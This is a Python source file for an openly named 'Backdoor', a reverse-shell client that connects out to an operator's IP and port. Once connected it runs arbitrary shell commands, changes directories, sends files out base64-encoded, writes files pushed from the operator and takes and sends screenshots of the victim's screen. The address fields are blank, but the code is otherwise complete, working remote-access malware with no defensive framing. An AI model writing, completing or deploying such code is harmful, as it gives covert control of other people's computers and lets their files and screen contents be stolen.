ip = ""
port = None
import socket, json
import subprocess, os
import base64, pyautogui

class Backdoor:
    def __init__(self, ip: str, port: int):
        self.ip = ip
        self.port = port
        self.addr = (self.ip, self.port)
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect(self.addr)

    def recv(self):
        json_data = b''
        while True:
            try:
                json_data += self.socket.recv(1024)
                return json.loads(json_data.decode("utf8"))
            except ValueError:
                continue

    def send(self, message: str):
        json_data = json.dumps(message)
        json_data = json_data.encode("utf8")        
        self.socket.send(json_data)

    def read_files(self, file_name: str) -> bytes:
        with open(os.getcwd() + f"/{file_name}", "rb") as f:
            file_content = base64.b64encode(f.read())
            return file_content

    def check(self, command: str):
        if command == "quit":
            self.socket.close()
            exit()
        else:
            if command[:2] == "cd":
                os.chdir(command[3:])
                self.send(f"[+] Chanding Directory To {command[3:]}")
            elif command[:8] == "download":
                file_content = self.read_files(command[9:]).decode("utf8")
                self.send(file_content)
            elif command[:6] == "upload":
                with open(command[7:], "wb") as f:
                    f.write(base64.b64decode(self.recv()))
            elif command == "screenshot":
                s = pyautogui.screenshot()
                s.save("ss.png")
                file_content = self.read_files("ss.png").decode("utf8")
                self.send(file_content)
                os.remove("ss.png")
            else:
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL).decode("utf8")
                    self.send(output)
                except Exception as e:
                    self.send(str(e))

    def handle_connection(self):
        while True:
            cmd = self.recv()
            self.check(cmd)

if __name__ == "__main__":
    shell = Backdoor(ip, port)
    shell.handle_connection()
